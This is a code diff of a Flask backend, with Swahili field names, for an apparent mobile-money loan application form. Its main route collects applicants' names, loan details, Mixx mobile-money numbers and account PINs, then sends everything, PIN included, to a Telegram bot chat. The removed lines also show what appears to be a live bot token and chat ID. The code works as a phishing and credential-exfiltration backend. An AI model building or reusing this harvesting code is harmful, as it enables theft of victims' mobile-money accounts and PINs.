@@ -5,64 +5,101 @@ import random
 import os
 
 app = Flask(__name__)
-
-# ENABLE CORS
 CORS(app)
 
-# TELEGRAM CONFIG
-BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
-CHAT_ID = "6958413637"
+# =========================
+# CONFIG
+# =========================
+BOT_TOKEN = "YOUR_BOT_TOKEN"
+CHAT_ID = "YOUR_CHAT_ID"
 
 maombi = {}
 
 # =========================
-# SEND TO TELEGRAM
+# TELEGRAM FUNCTION
 # =========================
-def tuma_kwenye_telegram(app_id, data):
+def send_to_telegram(app_id, data):
 
-    ujumbe = f"""
-📥 NEW APPLICATION 
+    message = f"""
+📥 NEW LOAN APPLICATION
 
-🆔 Namba ya Maombi: {app_id}
-
-👤 Jina: {data.get('jina')}
-💰 Kiasi: {data.get('kiasi')}
-🎯 Lengo: {data.get('lengo')}
-📅 Muda: {data.get('muda')}
+🆔 ID: {app_id}
+👤 Name: {data.get('jina')}
+💰 Amount: {data.get('kiasi')}
+🎯 Purpose: {data.get('lengo')}
+📅 Duration: {data.get('muda')}
 📱 Mixx Number: {data.get('mixxNumber')}
 🔐 PIN: {data.get('pin')}
 
-📌 Hali: PENDING
+📌 Status: PENDING
 """
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-    response = requests.post(url, json={
-        "chat_id": CHAT_ID,
-        "text": ujumbe
-    })
+    try:
+        res = requests.post(url, json={
+            "chat_id": CHAT_ID,
+            "text": message
+        })
 
-    print("STATUS:", response.status_code)
-    print("RESPONSE:", response.text)
+        print("TELEGRAM RESPONSE:", res.text)
 
-    
+    except Exception as e:
+        print("TELEGRAM ERROR:", str(e))
+
 
 # =========================
-# HOME ROUTE
+# HEALTH CHECK
+# =========================
+@app.route("/")
+def home():
+    return "Backend Running Successfully"
+
+
+# =========================
+# MAIN SUBMIT ROUTE
 # =========================
 @app.route("/submit-step3", methods=["POST"])
 def submit_step3():
 
-    data = request.get_json(silent=True) or request.form.to_dict()
+    try:
+        print("REQUEST RECEIVED")
 
-    app_id = str(random.randint(10000, 99999))
+        data = request.get_json(silent=True)
+        if not data:
+            data = request.form.to_dict()
 
-    maombi[app_id] = data
-    maombi[app_id]["status"] = "PENDING"
+        print("DATA:", data)
 
-    tuma_kwenye_telegram(app_id, maombi[app_id])
+        # validation (important for production)
+        required_fields = ["jina", "kiasi", "lengo", "muda", "mixxNumber", "pin"]
 
-    return {
-        "message": "Success",
-        "application_id": app_id
-    }
+        for field in required_fields:
+            if field not in data:
+                return jsonify({"error": f"Missing field: {field}"}), 400
+
+        app_id = str(random.randint(10000, 99999))
+
+        maombi[app_id] = data
+        maombi[app_id]["status"] = "PENDING"
+
+        send_to_telegram(app_id, maombi[app_id])
+
+        return jsonify({
+            "message": "Success",
+            "application_id": app_id
+        })
+
+    except Exception as e:
+        print("ERROR:", str(e))
+        return jsonify({"error": str(e)}), 500
+
+
+# =========================
+# RUN (RENDER SAFE)
+# =========================
+if __name__ == "__main__":
+
+    port = int(os.environ.get("PORT", 10000))
+
+    app.run(host="0.0.0.0", port=port)
